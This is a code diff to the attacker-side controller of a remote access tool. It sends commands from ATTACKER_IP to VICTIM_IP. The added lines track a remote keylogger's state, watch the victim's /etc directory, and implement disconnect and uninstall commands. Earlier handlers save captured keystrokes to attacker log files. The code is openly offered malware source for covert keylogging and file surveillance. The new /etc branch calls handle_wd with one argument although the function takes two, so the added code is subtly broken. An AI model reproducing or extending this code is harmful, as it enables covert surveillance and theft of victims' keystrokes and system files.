@@ -74,6 +74,7 @@ def handle_dl(args: list[str]) -> str:
 def handle_kstart(args: list[str], state: dict) -> str:
     send_data(b'k+', src=ATTACKER_IP, dst=VICTIM_IP)
     file_bytes = receive_data(from_ip=VICTIM_IP)
+    state['keylogger_started'] = True
     return file_bytes.decode()
 
 def handle_kstop(args: list[str], state: dict) -> str:
@@ -83,6 +84,7 @@ def handle_kstop(args: list[str], state: dict) -> str:
     log_path = Path(f'data/attacker/keylog_{timestamp}')
     log_path.parent.mkdir(parents=True, exist_ok=True)
     log_path.write_bytes(file_bytes)
+    state['keylogger_started'] = False
     return f'Keylog saved to {log_path}'
 
 def handle_rn(args: list[str]) -> str:
@@ -115,6 +117,10 @@ def handle_wf(args: list[str], state: dict) -> str:
     if not args:
         return 'Missing path argument'
     path = args[0]
+
+    if path.startswith('/etc'):
+        handle_wd(['/etc'])
+    
     watch_dir = Path(f'data/watched/wf_{datetime.now().strftime("%H_%M_%Y_%m_%d")}')
     stop_event = threading.Event()
     recv_thread = threading.Thread(
@@ -144,10 +150,10 @@ def handle_wd(args: list[str], state: dict) -> str:
     return _watch_loop(stop_event, recv_thread, watch_dir, 'Directory')
 
 def handle_dc(_: list[str], state: dict) -> str:
-    # Implement graceful disconnect. Not much to be done here as there is no socket connection to close
-    # but should probably communicated to the victim to go back to listening for port knocks.
-    return f'Command not supported yet'
+    send_data(b'dc', src=ATTACKER_IP, dst=VICTIM_IP)
+    state['connected_to_victim'] = False
+    return f'Disconnected from victim'
 
 def handle_un(_: list[str], state: dict) -> str:
-    # Implement uninstall command. Result should be that the victim program is no longer running.
-    return f'Command not supported yet'
+    send_data(b'un', src=ATTACKER_IP, dst=VICTIM_IP)
+    return f'Uninstall initiated'
